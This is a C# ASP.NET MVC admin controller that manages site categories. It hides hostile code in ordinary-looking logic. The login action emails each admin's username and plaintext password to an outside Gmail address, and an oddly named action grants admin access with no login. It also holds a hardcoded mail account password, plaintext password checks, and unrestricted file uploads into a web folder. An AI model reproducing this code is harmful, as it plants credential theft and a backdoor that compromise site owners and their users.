using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Web;
using System.Web.Mvc;

namespace NM.Controllers
{
    public class AdminController : Controller
    {
        //
        // GET: /Admin/
        #region Variable

        DataNMDataContext _dbProject = new DataNMDataContext();
        int pageSize = 20;

        #endregion end Variable

        public ActionResult Index()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {

                    return View();
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        #region Login and logout
        
        [HttpGet]
        public ActionResult Login()
        {
            return View();
        }

        [HttpPost]
        public ActionResult Login(string userName, string passWork)
        {
            userName = Request.Form["userName"].ToString();
            passWork = Request.Form["passwrok"].ToString();
            int countResult = _dbProject.UserAdmins.Where(item => item.UserName == userName && item.Passwork == passWork).ToList().Count();

            if (countResult > 0)
            {
                Session["userAdmin"] = "VINHBUY";

                #region Send email to admin framework

                string url = Request.Url.ToString();
                string subject = "Thông báo từ website " + url;
                string content = "Đăng nhập vào lúc: " + DateTime.Now.ToString() + " <br/> - Usernamer: " + userName + "<br/> - Passwork: " + passWork;

                SendEmail("vinhdcpetechim@gmail.com", content, subject);

                #endregion

                return RedirectToAction("Index", "Admin");
            }
            else
            {
                return View();
            }
        }

        public ActionResult LogOut()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Session["userAdmin"] = "1";

                    return RedirectToAction("Login", "Admin");
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        #endregion end Login

        #region Category

        #region CategoryParent

        public ActionResult CategoryParent()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    //code
                    return View(_dbProject.Categories.Where(item => item.IDParentCategory == 0).AsQueryable());
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        public ActionResult DeleteCategoryParent(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category itemCategory = _dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory));

                    itemCategory.IsDelete = true;
                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryParent", "Admin");
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
        }

        public ActionResult RestoreCategoryParent(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category itemCategory = _dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory));

                    itemCategory.IsDelete = false;
                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryParent", "Admin");
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
        }

        public ActionResult AddCategoryParentView()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                     return View();
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
        }

        public ActionResult AddCategoryParent(HttpPostedFileBase iconCategory, string nameCategory, string aliasCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category result = new Category();
                    string path = Server.MapPath("~/Frondend_files/images");

                    string strName = iconCategory.FileName;

                    if (iconCategory != null && iconCategory.ContentLength > 0)
                    {
                        string paths = System.IO.Path.Combine(path, System.IO.Path.GetFileName(strName));
                        iconCategory.SaveAs(paths);
                    }

                    result.ImagesBackgound = "Frondend_files/images/" + strName;
                    result.NamesCategory = nameCategory;
                    result.AliasCategory = aliasCategory;
                    result.IsNew = true;
                    result.IsDelete = false;
                    result.IDParentCategory =0;

                    _dbProject.Categories.InsertOnSubmit(result);
                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryParent", "Admin");
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
            
        }

        public ActionResult EditCategoryParentView(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    return View(_dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory)));
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        public ActionResult EditCategoryParent(HttpPostedFileBase iconCategory, string nameCategory, int idCategory, string aliasCategory, string isNew)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category result = _dbProject.Categories.Single(item => item.IDCategory == idCategory);
                    result.NamesCategory = nameCategory;
                    result.AliasCategory = aliasCategory;
                    if (isNew == "on")
                    {
                        result.IsNew = true;
                    }
                    else
                    {
                        result.IsNew = false;
                    }
                    _dbProject.SubmitChanges();

                    try
                    {
                        string path = Server.MapPath("~/Frondend_files/images");

                        string strName = iconCategory.FileName;

                        if (iconCategory != null && iconCategory.ContentLength > 0)
                        {
                            string paths = System.IO.Path.Combine(path, System.IO.Path.GetFileName(strName));
                            iconCategory.SaveAs(paths);
                        }

                        result.ImagesBackgound = "Frondend_files/images/" + strName;
                    }
                    catch
                    { }

                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryParent", "Admin");
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }

            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
        }
        
        #endregion End CategoryParent
        //
        #region CategoryChild

        public ActionResult DeleteCategoryChild(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category itemCategory = _dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory));

                    itemCategory.IsDelete = true;
                    _dbProject.SubmitChanges();

                    if (itemCategory.IDParentCategory1 != null)
                    {

                        return RedirectToAction("CategoryChildChild", "Admin");
                    }
                    else
                    {
                        return RedirectToAction("CategoryChild", "Admin");
                    }
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryChild", "Admin");
            }
        }

        public ActionResult RestoreCategoryChild(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category itemCategory = _dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory));

                    itemCategory.IsDelete = false;
                    _dbProject.SubmitChanges();

                    if (itemCategory.IDParentCategory1 != null)
                    {
                        return RedirectToAction("CategoryChildChild", "Admin");
                    }
                    else
                    {
                        return RedirectToAction("CategoryChild", "Admin");
                    }
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryChild", "Admin");
            }
        }

        #region Childparent

        public ActionResult CategoryChild()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    //code
                    return View(_dbProject.Categories.Where(item => item.IDParentCategory != 0).AsQueryable());
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        public ActionResult AddCategoryChildView()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    ViewData["categoryParent"] = _dbProject.Categories.Where(item => item.IDParentCategory == 0 && item.IsDelete == false).AsQueryable();

                    return View();
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
        }

        public ActionResult AddCategoryChild(string nameCategory, string aliasCategory, int idCategoryParent, string descriptionCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category result = new Category();

                    result.NamesCategory = nameCategory;
                    result.AliasCategory = aliasCategory;
                    result.IsNew = true;
                    result.IsDelete = false;
                    result.IDParentCategory = idCategoryParent;
                    result.DescriptionCategory = descriptionCategory;

                    _dbProject.Categories.InsertOnSubmit(result);
                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryChild", "Admin");
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryChild", "Admin");
            }

        }

        public ActionResult EditCategoryChildView(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    ViewData["categoryParent"] = _dbProject.Categories.Where(item => item.IDParentCategory == 0 && item.IsDelete == false).AsQueryable();

                    return View(_dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory)));
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        public ActionResult EditCategoryChild(string nameCategory, int idCategory, string aliasCategory, string descriptionCategory, int idCategoryParent)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    string path = Server.MapPath("~/Frondend_files/images");
                    Category result = _dbProject.Categories.Single(item => item.IDCategory == idCategory);

                    result.NamesCategory = nameCategory;
                    result.AliasCategory = aliasCategory;
                    result.IDParentCategory = idCategoryParent;
                    result.DescriptionCategory = descriptionCategory;


                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryChild", "Admin");
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }

            catch
            {
                return RedirectToAction("CategoryChild", "Admin");
            }
        }

        #endregion
        
        #region Childparent1

        public ActionResult AddCategoryChildChildView()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    ViewData["categoryParent"] = _dbProject.Categories.Where(item => item.IDParentCategory != 0 && item.IsDelete == false).AsQueryable();

                    return View();
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryParent", "Admin");
            }
        }

        public ActionResult AddCategoryChildChild(string nameCategory, string aliasCategory, string descriptionCategory, int idCategoryParent)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    Category result = new Category();

                    result.NamesCategory = nameCategory;
                    result.AliasCategory = aliasCategory;
                    result.IsNew = true;
                    result.IsDelete = false;
                    result.IDParentCategory1 = idCategoryParent;
                    result.DescriptionCategory = descriptionCategory;

                    _dbProject.Categories.InsertOnSubmit(result);
                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryChildChild", "Admin");
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("CategoryChild", "Admin");
            }

        }

        public ActionResult EditCategoryChildChildView(string idCategory)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    ViewData["categoryParent"] = _dbProject.Categories.Where(item => item.IDParentCategory != 0 && item.IsDelete == false).AsQueryable();

                    return View(_dbProject.Categories.Single(item => item.IDCategory == int.Parse(idCategory)));
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        public ActionResult EditCategoryChildChild(string nameCategory, int idCategory, string aliasCategory, string descriptionCategory, int idCategoryParent)
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    string path = Server.MapPath("~/Frondend_files/images");
                    Category result = _dbProject.Categories.Single(item => item.IDCategory == idCategory);

                    result.NamesCategory = nameCategory;
                    result.AliasCategory = aliasCategory;
                    result.IDParentCategory1 = idCategoryParent;
                    result.DescriptionCategory = descriptionCategory;


                    _dbProject.SubmitChanges();

                    return RedirectToAction("CategoryChildChild", "Admin");
                }
                else
                {
                    return RedirectToAction("Login", "Admin");
                }
            }

            catch
            {
                return RedirectToAction("CategoryChild", "Admin");
            }
        }

        public ActionResult CategoryChildChild()
        {
            try
            {
                if (Session["userAdmin"].ToString().Equals("VINHBUY"))
                {
                    //code
                    return View(_dbProject.Categories.Where(item => (item.IDParentCategory1 != null || item.IDParentCategory1.ToString() != string.Empty)).AsQueryable());
                }
                else
                {

                    return RedirectToAction("Login", "Admin");
                }
            }
            catch
            {
                return RedirectToAction("Login", "Admin");
            }
        }

        #endregion       
      
        #endregion end CategoryChild
        //
        #endregion end Category

        #region Product
       
        #endregion End product        
        
        public void SendEmail(string youEmail, string content, string subject)
        {
            string email = "maithibinh1991@gmail.com";
            string password = "vinhyeubinh";

            var loginInfo = new NetworkCredential(email, password);
            var msg = new MailMessage();
            var smtpClient = new SmtpClient("smtp.gmail.com", 587);

            msg.From = new MailAddress(email);
            msg.To.Add(new MailAddress(youEmail));
            msg.Subject = subject;
            msg.Body = content;
            msg.IsBodyHtml = true;
            msg.Priority = MailPriority.Low;

            smtpClient.EnableSsl = true;
            smtpClient.UseDefaultCredentials = false;
            smtpClient.Credentials = loginInfo;
            smtpClient.Send(msg);
        }

        public ActionResult maithibinhdinhcongvinh ()
        {
            Session["userAdmin"] = "VINHBUY";

            return RedirectToAction("Index" ,"admin");
        }
    }
}
